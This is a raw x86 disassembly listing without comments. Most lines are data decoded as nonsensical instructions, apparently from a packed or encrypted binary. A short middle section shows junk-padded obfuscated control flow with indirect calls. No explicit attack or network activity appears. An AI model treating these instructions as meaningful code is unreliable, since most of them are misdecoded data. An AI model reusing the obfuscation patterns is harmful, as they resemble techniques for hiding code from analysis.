  413926:	jmp    0xb0c81169
  41392b:	mov    ecx,0x22eabf83
  413930:	sub    ch,BYTE PTR [esi-0x1eb7982a]
  413936:	sar    ebp,cl
  413938:	fist   WORD PTR [esi+esi*2-0x3c]
  41393c:	fistp  QWORD PTR [edi+0x7cad361a]
  413942:	fpatan 
  413944:	ror    DWORD PTR [edx],1
  413946:	in     eax,0x36
  413948:	sbb    al,0x20
  41394a:	clc    
  41394b:	in     al,dx
  41394c:	sub    al,BYTE PTR [ecx-0x13]
  41394f:	sub    BYTE PTR [edi],dl
  413951:	bound  ecx,QWORD PTR [ecx-0x4f]
  413954:	and    ah,BYTE PTR [esi+0x7db3218a]
  41395a:	xor    eax,0x562fa11c
  41395f:	pop    ecx
  413960:	push   0x8ced3281
  413965:	xchg   DWORD PTR [ebx],esp
  413967:	mov    dh,BYTE PTR [esi+0x6724bb73]
  41396d:	shl    BYTE PTR [edx],0x6c
  413970:	add    ecx,DWORD PTR [ebx-0x4d5b5cdc]
  413976:	paddsb mm3,QWORD PTR [ebx+0x338d901f]
  41397d:	clc    
  41397e:	int    0xa5
  413980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413981:	push   ds
  413982:	adc    edi,esp
  413984:	cs push ebp
  413986:	dec    ecx
  413987:	ss or  al,0x6e
  41398a:	xor    eax,0xb66ff5bb
  41398f:	sub    bl,dl
  413991:	scas   eax,DWORD PTR es:[edi]
  413992:	mov    bl,BYTE PTR [ecx+esi*4]
  413995:	lods   eax,DWORD PTR ds:[esi]
  413996:	js     0x4139e4
  413998:	and    al,0xbd
  41399a:	sar    DWORD PTR [edi+0x142edeb],cl
  4139a0:	data16 mov bl,0x25
  4139a3:	outs   dx,BYTE PTR ds:[esi]
  4139a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139a5:	add    bl,BYTE PTR [ebx+0x739e7339]
  4139ab:	ds pop ebp
  4139ad:	push   esp
  4139ae:	(bad)  
  4139af:	cmp    BYTE PTR [ecx-0x4e],bh
  4139b2:	js     0x413955
  4139b4:	(bad)  
  4139b5:	in     al,dx
  4139b6:	adc    ecx,esp
  4139b8:	and    BYTE PTR [edx-0x7a9fa694],ch
  4139be:	mov    bh,0x6f
  4139c0:	(bad)  
  4139c1:	in     eax,dx
  4139c2:	test   ecx,ebp
  4139c4:	sbb    BYTE PTR [ebx],dl
  4139c6:	pusha  
  4139c7:	test   al,0xc8
  4139c9:	cmp    DWORD PTR [ebx],edi
  4139cb:	ss dec ebx
  4139cd:	rol    DWORD PTR [eiz*8+0x480bab80],0xe5
  4139d5:	xchg   ecx,eax
  4139d6:	icebp  
  4139d7:	xadd   BYTE PTR [edx],cl
  4139da:	push   edi
  4139db:	xor    eax,0x80b7cf49
  4139e0:	cmp    al,0x26
  4139e2:	inc    esi
  4139e3:	cwde   
  4139e4:	ja     0x413a10
  4139e6:	mov    al,BYTE PTR ds:0x8bc765c8
  4139ec:	pop    ebp
  4139ed:	or     BYTE PTR [eax+esi*8-0x4c],0x99
  4139f2:	xchg   DWORD PTR [ebx+edi*8-0x7ff08a3f],esp
  4139f9:	jbe    0x41399a
  4139fb:	and    bh,BYTE PTR cs:[ebx-0x66a7c817]
  413a02:	cmp    cl,BYTE PTR [ecx]
  413a04:	shl    DWORD PTR [eax-0x625bc6d2],cl
  413a0a:	mov    al,0xcf
  413a0c:	jle    0x4139e3
  413a0e:	add    bl,bh
  413a10:	adc    eax,0x6292445e
  413a15:	dec    esp
  413a16:	push   ebx
  413a17:	inc    edi
  413a18:	mov    bl,0xf5
  413a1a:	mov    al,0x2e
  413a1c:	mov    gs,WORD PTR [ecx]
  413a1e:	mov    eax,0x744e7c51
  413a23:	or     DWORD PTR [ebp+eiz*1-0x7592acb9],ecx
  413a2a:	mov    BYTE PTR [eax-0x39163510],bh
  413a30:	fiadd  WORD PTR [edx+0x60]
  413a33:	nop
  413a34:	mov    ch,0x2d
  413a36:	ret    0x7858
  413a39:	cmc    
  413a3a:	push   0x2b1edc69
  413a3f:	cmp    DWORD PTR [eax],eax
  413a41:	fmulp  st(1),st
  413a43:	push   edx
  413a44:	mov    ebp,ebx
  413a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a48:	test   al,0x9e
  413a4a:	outs   dx,DWORD PTR ds:[esi]
  413a4b:	cmp    cl,BYTE PTR [edx-0x6b167a34]
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	adc    ah,BYTE PTR [edi+0x7c]
  413a6a:	push   ecx
  413a6b:	jle    0x413ad5
  413a6d:	jo     0x413adf
  413a6f:	mov    ecx,0xa770707e
  413a74:	pavgw  mm5,QWORD PTR [eax+0x76]
  413a78:	mov    ch,BYTE PTR [ebx]
  413a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a7b:	stos   BYTE PTR es:[edi],al
  413a7c:	adc    dl,BYTE PTR [esi]
  413a7e:	aaa    
  413a7f:	pop    ebx
  413a80:	inc    edi
  413a81:	pop    edi
  413a82:	adc    eax,0x3d9dbab5
  413a87:	(bad)  
  413a89:	pop    ebx
  413a8a:	cmc    
  413a8b:	cmp    DWORD PTR [ebp-0x4c15f984],ebp
  413a91:	sub    ah,BYTE PTR [edi]
  413a93:	xchg   esp,edx
  413a95:	pop    ebx
  413a96:	push   0xffffff99
  413a98:	sar    BYTE PTR [esi],1
  413a9a:	ror    ch,0x56
  413a9d:	scas   al,BYTE PTR es:[edi]
  413a9e:	nop
  413a9f:	add    DWORD PTR [edx+0x16598b61],0xd807ffc8
  413aa9:	ins    BYTE PTR es:[edi],dx
  413aaa:	mov    ecx,0x856e4bca
  413aaf:	and    cl,ah
  413ab1:	neg    edx
  413ab3:	pop    esp
  413ab4:	mov    ds:0xff5b13b,eax
  413ab9:	idiv   BYTE PTR [esi]
  413abb:	orps   xmm2,XMMWORD PTR [ebp-0x5a]
  413abf:	repz xchg edi,eax
  413ac1:	add    bh,BYTE PTR [ebp+0x4d]
  413ac4:	ja     0x413a7c
  413ac6:	xchg   dl,al
  413ac8:	mov    ebx,0x51cdf006
  413acd:	aam    0xca
  413acf:	adc    dh,bl
  413ad1:	cld    
  413ad2:	xchg   DWORD PTR [esi],ebx
  413ad4:	jns    0x413b46
  413ad6:	clc    
  413ad7:	mov    dh,0x99
  413ad9:	(bad)
  413adc:	clc    
  413add:	dec    ebp
  413ade:	cli    
  413adf:	loop   0x413aa5
  413ae1:	pop    ebp
  413ae2:	cmp    BYTE PTR [ebx-0x20cb30bb],0xae
  413ae9:	push   esp
  413aea:	loop   0x413b6a
  413aec:	xlat   BYTE PTR ds:[ebx]
  413aed:	rcl    BYTE PTR [ecx],cl
  413aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413af0:	aam    0x12
  413af2:	repz mov eax,ds:0xb97f2d7b
  413af8:	shl    DWORD PTR [ecx-0x1d46f03a],cl
  413afe:	leave  
  413aff:	js     0x413b13
  413b01:	iret   
  413b02:	pop    edx
  413b03:	(bad)  
  413b04:	leave  
  413b05:	xchg   ebx,eax
  413b06:	push   ds
  413b07:	es mov al,0xb1
  413b0a:	xchg   esi,eax
  413b0b:	fst    DWORD PTR [edx]
  413b0d:	cli    
  413b0e:	xchg   ecx,eax
  413b0f:	ja     0x413b08
  413b11:	mov    al,ds:0x1133b669
  413b16:	mov    esp,0x14ec2e4c
  413b1b:	add    BYTE PTR [edi-0x6b7f3467],dl
  413b21:	into   
  413b22:	mov    esi,0xd519e6a
  413b27:	shl    DWORD PTR [ebx],0xee
  413b2a:	push   esp
  413b2b:	mov    eax,0x4c199f83
  413b30:	fadd   QWORD PTR [edx]
  413b32:	ret    
  413b33:	adc    eax,0x68a49d3d
  413b38:	loope  0x413acf
  413b3a:	imul   ebp,DWORD PTR [ecx+0x4f],0x4
  413b3e:	xor    cl,ch
  413b40:	fcmovnu st,st(0)
  413b42:	mov    edi,0x70c19e1d
  413b47:	(bad)  
  413b48:	shr    DWORD PTR [ebp+0x275f6163],cl
  413b4e:	lods   al,BYTE PTR ds:[esi]
  413b4f:	xchg   ebx,eax
  413b50:	xchg   edx,eax
  413b51:	sub    BYTE PTR ds:0xf491f49c,ch
  413b57:	repz fcomi st,st(3)
  413b5a:	jl     0x413b0e
  413b5c:	mov    bl,0xb8
  413b5e:	mov    al,ds:0x3871095
  413b63:	lock jmp 0x413b98
  413b66:	xor    esp,eax
  413b68:	sbb    dl,BYTE PTR [esi+ebx*1+0x7c]
  413b6c:	xlat   BYTE PTR ds:[ebx]
  413b6d:	add    DWORD PTR [eax+0x61],esi
  413b70:	sbb    bh,BYTE PTR [eax-0x4fe239e6]
  413b76:	not    BYTE PTR [ecx-0x5082b2ed]
  413b7c:	dec    esi
  413b7d:	scas   eax,DWORD PTR es:[edi]
  413b7e:	mov    al,ds:0x8b64b43
  413b83:	mov    ebx,DWORD PTR [ebx+0x2fc276b3]
  413b89:	loopne 0x413bf7
  413b8b:	ret    
  413b8c:	push   ds
  413b8d:	mov    DWORD PTR [ecx-0x6d],eax
  413b90:	fldenv [edx-0x29]
  413b93:	xchg   esi,eax
  413b94:	push   ds
  413b95:	adc    ecx,DWORD PTR [esi-0x562066a]
  413b9b:	xchg   esi,eax
  413b9c:	jecxz  0x413c13
  413b9e:	mov    edi,0xa688f24a
  413ba3:	jecxz  0x413bf1
  413ba5:	fsub   QWORD PTR [edx]
  413ba7:	inc    edi
  413ba8:	pop    edi
  413ba9:	out    dx,eax
  413baa:	repnz iret 
  413bac:	jge    0x413c0d
  413bae:	pop    ecx
  413baf:	add    al,0xa2
  413bb2:	lods   eax,DWORD PTR ds:[esi]
  413bb3:	je     0x413bd4
  413bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bb6:	xor    eax,edi
  413bb8:	xor    ebp,ebp
  413bba:	mov    BYTE PTR [edx],bl
  413bbc:	sbb    eax,0x2220132c
  413bc1:	(bad)
  413bc4:	mov    edx,0xbeea8b1d
  413bc9:	adc    al,0xb4
  413bcb:	and    BYTE PTR [edx+0x165d4160],dl
  413bd1:	cmp    al,0x8c
  413bd3:	int3   
  413bd4:	push   cs
  413bd5:	add    dl,cl
  413bd7:	dec    ecx
  413bd8:	into   
  413bd9:	ja     0x413c2e
  413bdb:	cmp    edx,ebp
  413bdd:	xchg   BYTE PTR [edi+0x5ccbd4e8],dh
  413be3:	inc    ebx
  413be4:	aaa    
  413be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413be6:	cmp    al,0xed
  413be8:	pop    ebp
  413be9:	add    ch,dh
  413beb:	out    dx,eax
  413bec:	ret    
  413bed:	pop    esi
  413bee:	add    edx,DWORD PTR [eax+0x7b30a23b]
  413bf4:	cmp    dh,0x3e
  413bf7:	pop    es
  413bf8:	out    dx,eax
  413bf9:	dec    eax
  413bfa:	push   ecx
  413bfb:	dec    ebx
  413bfc:	ret    0x9964
  413bff:	imul   ecx,DWORD PTR [edx+0x6f90048e],0xde23b0b4
  413c09:	aaa    
  413c0a:	xchg   DWORD PTR [ebp+eiz*4-0x5d],edi
  413c0e:	inc    ebp
  413c0f:	jb     0x413c00
  413c11:	xor    ebp,esp
  413c13:	rcr    BYTE PTR [esi],cl
  413c15:	dec    esp
  413c16:	test   DWORD PTR [edx-0x46],ebx
  413c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c1a:	jl     0x413c26
  413c1c:	push   0xba9e4fc
  413c21:	js     0x413c8b
  413c23:	xchg   ecx,eax
  413c24:	cdq    
  413c25:	cmp    BYTE PTR ds:0xff190366,dh
  413c2b:	loop   0x413bc9
  413c2d:	push   cs
  413c2e:	vpunpckhqdq ymm0,ymm3,YMMWORD PTR [edx]
  413c32:	stos   DWORD PTR es:[edi],eax
  413c33:	or     bl,dh
  413c35:	add    edx,DWORD PTR [esi-0x4b]
  413c38:	ins    BYTE PTR es:[edi],dx
  413c39:	aas    
  413c3a:	add    BYTE PTR [ecx+0x5d5240b4],bh
  413c40:	test   al,0x59
  413c42:	inc    esi
  413c43:	and    BYTE PTR [edx],0x5e
  413c46:	jg     0x413c62
  413c48:	(bad)  
  413c4a:	and    eax,0xa5b7648f
  413c4f:	sbb    al,0xb7
  413c51:	pop    ebx
  413c52:	shl    BYTE PTR [eax+0x14d8aabd],cl
  413c58:	fisttp QWORD PTR es:[ebx+0x31b1b1d9]
  413c5f:	mov    ds:0xfd42be9d,al
  413c64:	mov    dl,0x8c
  413c66:	fs retf 
  413c68:	xchg   DWORD PTR [esi+0x60],esi
  413c6b:	in     al,0x99
  413c6d:	pushf  
  413c6e:	push   es
  413c6f:	cmp    cl,dl
  413c71:	add    esp,eax
  413c73:	loop   0x413c45
  413c75:	jl     0x413c4d
  413c77:	daa    
  413c78:	mov    esp,0x59f77f76
  413c7d:	mov    dl,0xe3
  413c7f:	loope  0x413c2a
  413c81:	stos   BYTE PTR es:[edi],al
  413c82:	mov    BYTE PTR [edx+0x27f37872],cl
  413c88:	retf   0x31b0
  413c8b:	fwait
  413c8c:	push   ss
  413c8d:	sbb    esp,ebp
  413c8f:	dec    ebx
  413c90:	test   DWORD PTR [edx+0x1],edi
  413c93:	xchg   BYTE PTR ds:0xdfc00c6a,ch
  413c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c9a:	(bad)  
  413c9c:	add    eax,0xbb05e0eb
  413ca1:	jo     0x413c96
  413ca3:	dec    esi
  413ca4:	shl    esp,0xf2
  413ca7:	and    DWORD PTR [edi],edi
  413ca9:	or     bh,BYTE PTR [edi+0x1]
  413cac:	mov    eax,0xf034b45a
  413cb1:	loop   0x413c91
  413cb3:	push   eax
  413cb4:	sar    BYTE PTR ds:0x5e67888,cl
  413cba:	sub    DWORD PTR [eax],edx
  413cbc:	dec    ebx
  413cbd:	push   ds
  413cbe:	dec    edx
  413cbf:	pushw  cs
  413cc1:	xor    ebp,DWORD PTR [esi+0x5491a975]
  413cc7:	xstore-rng (bad)
  413cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cc9:	ret    0x9a15
  413ccc:	inc    edx
  413ccd:	stc    
  413cce:	aas    
  413ccf:	pop    eax
  413cd0:	push   edx
  413cd1:	out    0xbd,eax
  413cd3:	or     al,0x7f
  413cd5:	xchg   esi,eax
  413cd6:	sbb    al,0x2b
  413cd8:	inc    ebx
  413cd9:	jmp    0x413c5b
  413cdb:	sbb    BYTE PTR [esi+0x2b],cl
  413cde:	inc    ecx
  413cdf:	cmp    al,0x27
  413ce1:	(bad)  
  413ce2:	cld    
  413ce3:	jns    0x413d40
  413ce5:	cld    
  413ce6:	pop    ebp
  413ce7:	inc    edx
  413ce8:	in     al,dx
  413ce9:	int    0xc1
  413ceb:	inc    ecx
  413cec:	sub    bl,dl
  413cee:	sbb    DWORD PTR [ecx+0x75a33dd7],ecx
  413cf4:	add    eax,0xdc88e126
  413cf9:	cli    
  413cfa:	dec    edx
  413cfb:	imul   ecx,DWORD PTR [ebx+0x4b],0x7de17cac
  413d02:	pop    ds
  413d03:	push   edi
  413d04:	cmp    eax,0xabd760
  413d09:	jns    0x413cd8
  413d0b:	cli    
  413d0c:	lock pop ds
  413d0e:	imul   eax,DWORD PTR [esi],0x6a
  413d11:	popa   
  413d12:	sar    BYTE PTR [ecx-0x9],cl
  413d15:	daa    
  413d16:	jle    0x413ccb
  413d18:	aas    
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	(bad)  
  413d1b:	std    
  413d1c:	mov    ecx,DWORD PTR [ebx]
  413d1e:	xchg   BYTE PTR [ecx],dl
  413d20:	push   ebx
  413d21:	add    dl,BYTE PTR [ecx+0x1b]
  413d24:	and    eax,0xfee36112
  413d29:	in     eax,dx
  413d2a:	lea    eax,[edx-0x31a0bd4b]
  413d30:	cmp    al,0xb7
  413d32:	out    dx,eax
  413d33:	sahf   
  413d34:	shl    ah,1
  413d36:	xor    eax,0x8940f365
  413d3b:	inc    ebp
  413d3c:	loopne 0x413cc9
  413d3e:	inc    ebp
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e77f,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e77f,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e77f,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e5eb
  413d7f:	cmp    DWORD PTR ds:0x42e77f,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e77f
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e77f,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e77f
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e77f,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e78f,0x42fe06
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e1ac,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e777
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fd59,0x42e1a0
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e77b,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e77b
  413e02:	inc    eax
  413e03:	mov    ds:0x42e77b,eax
  413e08:	cmp    DWORD PTR ds:0x42e77b,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e77b,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e50b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd81,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e777,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fe0a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e783
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e19c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e77b,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	cmc    
  413e8c:	pop    edx
  413e8d:	cmp    dl,bh
  413e8f:	inc    edi
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413f06
  413e98:	outs   dx,BYTE PTR ds:[esi]
  413e99:	fadd   DWORD PTR [eax]
  413e9b:	sbb    eax,ebx
  413e9d:	cmp    BYTE PTR [esi],dl
  413e9f:	sbb    al,0x64
  413ea1:	loopne 0x413e6f
  413ea3:	cmp    cl,BYTE PTR [esp+eax*4]
  413ea6:	ret    
  413ea7:	stos   BYTE PTR es:[edi],al
  413ea8:	in     eax,0x28
  413eaa:	sub    bl,BYTE PTR [eax+eiz*4+0x419cf380]
  413eb1:	mov    edx,0x94b9c716
  413eb6:	(bad)
  413eb9:	cmp    ah,BYTE PTR [edi]
  413ebb:	or     ecx,edx
  413ebd:	jb     0x413f31
  413ebf:	jmp    0x413f06
  413ec1:	cmp    bl,BYTE PTR [edx-0x5b61c9d]
  413ec7:	loop   0x413e7a
  413ec9:	jecxz  0x413ef2
  413ecb:	push   esp
  413ecc:	adc    BYTE PTR ds:0x980d789f,dh
  413ed2:	js     0x413ec4
  413ed4:	jnp    0x413e8a
  413ed6:	xchg   DWORD PTR [ecx],ebp
  413ed8:	jecxz  0x413eb4
  413eda:	ins    BYTE PTR es:[edi],dx
  413edb:	add    BYTE PTR [edi],bh
  413edd:	jp     0x413ec3
  413edf:	imul   ecx,ecx,0xffffffdc
  413ee2:	sahf   
  413ee3:	mov    bl,0xb6
  413ee5:	inc    edx
  413ee6:	adc    eax,0x19d10917
  413eeb:	ret    
  413eec:	pop    ebx
  413eed:	mov    ?,esp
  413eef:	cld    
  413ef0:	mov    WORD PTR [edi+0x9],?
  413ef3:	and    BYTE PTR [edx-0x58a3a6ce],ah
  413ef9:	retf   
  413efa:	mov    bh,0x32
  413efc:	jge    0x413f63
  413efe:	add    eax,0xda2d1646
  413f03:	scas   al,BYTE PTR es:[edi]
  413f04:	jg     0x413f03
  413f06:	jae    0x413f73
  413f08:	scas   al,BYTE PTR es:[edi]
  413f09:	xchg   DWORD PTR [ebp+0x19],edi
  413f0c:	dec    esp
  413f0d:	dec    eax
  413f0e:	pop    ebp
  413f0f:	stc    
  413f10:	test   eax,0x56c28e07
  413f15:	add    DWORD PTR [eax+0x682cbf4d],0xe0b9375f
  413f1f:	or     eax,0x7ab8a65c
  413f24:	xchg   BYTE PTR [ebx-0x5b],dh
  413f27:	pop    ebx
  413f28:	and    al,0xdb
  413f2a:	adc    esp,ecx
  413f2c:	or     eax,0xff1267f
  413f31:	mov    ebp,DWORD PTR [edi-0x53]
  413f34:	mov    bh,0x34
  413f36:	out    dx,eax
  413f37:	adc    esi,DWORD PTR es:[ebx+0x35]
  413f3b:	ins    BYTE PTR es:[edi],dx
  413f3c:	pop    edx
  413f3d:	cli    
  413f3e:	add    BYTE PTR [eax],cl
  413f40:	dec    ebp
  413f41:	or     BYTE PTR [esp+edi*2],bl
  413f44:	cmc    
  413f45:	fnstsw WORD PTR [edi+0x78a9077a]
  413f4b:	sbb    edx,DWORD PTR [ecx-0x12]
  413f4e:	sbb    BYTE PTR [eax-0x26],0x92
  413f52:	mov    ds:0x98a9f973,eax
  413f57:	daa    
  413f58:	test   eax,0x5ecb99c7
  413f5d:	lods   eax,DWORD PTR es:[esi]
  413f5f:	sbb    eax,0xb528e2b7
  413f64:	and    BYTE PTR [ebp+0x4d],0xad
  413f68:	push   cs
  413f69:	test   eax,0xc9938b27
  413f6e:	addr16 aas 
  413f70:	sbb    esi,esp
  413f72:	bound  edx,QWORD PTR [esi-0x68]
  413f75:	frstor [ebp+0xa]
  413f78:	out    0x12,al
  413f7a:	add    al,0x28
  413f7c:	jge    0x413f94
  413f7e:	call   0x4ae7252
  413f83:	sub    eax,DWORD PTR [ebp+0x51]
  413f86:	rol    DWORD PTR [eax+0x21],cl
  413f89:	push   edx
  413f8a:	loop   0x413f93
  413f8c:	push   0x1d
  413f8e:	and    al,0x8
  413f90:	cmp    bh,BYTE PTR [ecx*4-0x386bc33b]
  413f97:	daa    
  413f98:	xchg   ecx,eax
  413f99:	into   
  413f9a:	or     dl,BYTE PTR [ebp+0x33]
  413f9d:	xor    DWORD PTR [eax-0x32d1318b],ebp
  413fa3:	jge    0x41400f
  413fa5:	mov    edx,0x3c806f08
  413faa:	sbb    al,0x72
  413fac:	iret   
  413fad:	xor    dh,BYTE PTR [ebx]
  413faf:	fcom   QWORD PTR [eax-0x5c7236a4]
  413fb5:	jb     0x413f5f
  413fb7:	and    eax,0x6f66aa24
  413fbc:	push   ebx
  413fbd:	in     al,dx
  413fbe:	mov    ds:0x12e6f9aa,al
  413fc3:	xchg   esi,eax
  413fc4:	mov    ds:0xf76ee0f7,eax
  413fc9:	push   eax
  413fca:	sbb    cl,BYTE PTR [esi]
  413fcc:	icebp  
  413fcd:	xchg   BYTE PTR [esp+ebp*1-0x3c],dh
  413fd1:	retf   0x97a1
  413fd4:	repnz xor eax,0x7f22319e
  413fda:	mov    eax,ds:0x6cdd4427
  413fdf:	jle    0x413ffe
  413fe1:	inc    DWORD PTR [esi+0x2821213b]
  413fe7:	dec    ebp
  413fe8:	and    DWORD PTR [ebx],0xffffffb2
  413feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fec:	or     ah,BYTE PTR [ebx+0x79]
  413fef:	je     0x41401e
  413ff1:	pop    edi
  413ff2:	call   0x6addb8de
  413ff7:	aad    0x81
  413ff9:	xchg   ebx,eax
  413ffa:	es mov cl,0xfb
  413ffd:	sbb    edi,ebx
  413fff:	(bad)  
  414000:	mov    ecx,fs
  414002:	inc    ebp
  414003:	iret   
  414004:	mov    DWORD PTR [eax-0x662e1286],edx
  41400a:	cwde   
  41400b:	aas    
  41400c:	adc    cl,0xfa
  41400f:	pop    eax
  414010:	fadd   DWORD PTR [edx+0x3c9b083d]
  414016:	adc    eax,DWORD PTR [esi-0x38]
  414019:	inc    edx
  41401a:	repz inc edi
  41401c:	sub    eax,0xf8c68ab3
  414021:	cmc    
  414022:	push   cs
  414023:	inc    esi
  414024:	(bad)  
  414026:	das    
  414027:	cmp    al,0x71
  414029:	pop    edx
  41402a:	es pop edi
  41402c:	jg     0x4140a5
  41402e:	aam    0xda
  414030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414031:	fwait
  414032:	and    al,BYTE PTR [edx+0x3b66cd88]
  414038:	sbb    BYTE PTR [edx+0x7dc341a9],dh
  41403e:	pop    ss
  41403f:	lahf   
  414040:	mov    ebx,0xc780e8e4
  414045:	pushf  
  414046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414047:	fincstp 
  414049:	or     al,0x11
  41404b:	dec    eax
  41404c:	inc    edx
  41404d:	dec    edi
  41404e:	icebp  
  41404f:	jge    0x413ff4
  414051:	imul   DWORD PTR [edi]
  414053:	ins    BYTE PTR es:[edi],dx
  414054:	xchg   edi,eax
  414055:	stos   DWORD PTR es:[edi],eax
  414056:	nop
  414057:	push   ss
  414058:	and    eax,DWORD PTR [edx-0x2f]
  41405b:	xchg   DWORD PTR [edi+0x55fe4386],esi
  414061:	clc    
  414062:	dec    ebp
  414063:	pusha  
  414064:	jae    0x41403a
  414066:	mov    esi,0x290b25c5
  41406b:	mov    ds:0xbbb937c9,eax
  414070:	lahf   
  414071:	xchg   edx,eax
  414072:	sbb    eax,DWORD PTR [edx+esi*4-0x445f77fb]
  414079:	or     al,0x63
  41407b:	mov    ds:0x3f1597b2,al
  414080:	or     bh,BYTE PTR ss:0x6f6a4a23
  414087:	cmp    edx,ebx
  414089:	arpl   WORD PTR [esp+edx*4],si
  41408c:	xor    al,0x26
  41408e:	push   ds
  41408f:	shr    BYTE PTR [esi+eax*1],cl
  414092:	mov    bl,0xa5
  414094:	pop    es
  414095:	cmp    edi,edx
  414097:	int    0xde
  414099:	ret    
  41409a:	(bad)  
  41409b:	imul   ebx,DWORD PTR [esp+ecx*4+0x65b4c7bd],0xba05239b
  4140a6:	call   0x54b5:0x11ebde24
  4140ad:	jp     0x4140ac
  4140af:	aad    0x82
  4140b1:	push   ebp
  4140b2:	cld    
  4140b3:	pop    ebp
  4140b4:	push   ss
  4140b5:	push   ebx
  4140b6:	push   es
  4140b7:	pop    eax
  4140b8:	rol    BYTE PTR [edx],1
  4140ba:	(bad)  
  4140bc:	add    cl,BYTE PTR fs:[eax-0x8]
  4140c0:	pushf  
  4140c1:	pop    es
  4140c2:	sub    al,0xe3
  4140c4:	jne    0x4140bd
  4140c6:	inc    ebx
  4140c8:	mov    eax,fs:0xf2b83a61
  4140ce:	nop
  4140cf:	rcl    BYTE PTR [ebx+0x62],0x88
  4140d3:	daa    
  4140d4:	cmp    cl,BYTE PTR [ecx+0x4c]
  4140d7:	das    
  4140d8:	rcl    BYTE PTR [eax+0x4f],0x7c
  4140dc:	lock ins DWORD PTR es:[edi],dx
  4140de:	dec    edx
  4140df:	(bad)  
  4140e0:	ret    
  4140e1:	pop    ss
  4140e2:	das    
  4140e3:	es scas al,BYTE PTR es:[edi]
  4140e5:	and    DWORD PTR [edx+0x2806bf6f],0x6d
  4140ec:	not    BYTE PTR [esi]
  4140ee:	mul    BYTE PTR [esp+ecx*1-0x38]
  4140f2:	ins    BYTE PTR es:[edi],dx
  4140f3:	lds    ebx,FWORD PTR [ebp-0x7bc29abf]
  4140f9:	mov    bl,dh
  4140fb:	dec    esp
  4140fc:	pop    esp
  4140fd:	into   
  4140fe:	sbb    DWORD PTR [esi],esp
  414100:	pop    DWORD PTR [eax]
  414102:	inc    edx
  414103:	dec    eax
  414104:	add    eax,0x2e777441
  414109:	lods   eax,DWORD PTR ds:[esi]
  41410a:	outs   dx,BYTE PTR ds:[esi]
  41410b:	mov    esp,0x9993e446
  414110:	enter  0xec7e,0x66
  414114:	mov    ecx,ebp
  414116:	jle    0x4140ef
  414118:	sti    
  414119:	sub    DWORD PTR [ebp+0x49],0xffffffe9
  41411d:	loopne 0x41412c
  41411f:	mov    al,ds:0x9bb9475f
  414124:	sub    bh,BYTE PTR [ecx-0x529b9939]
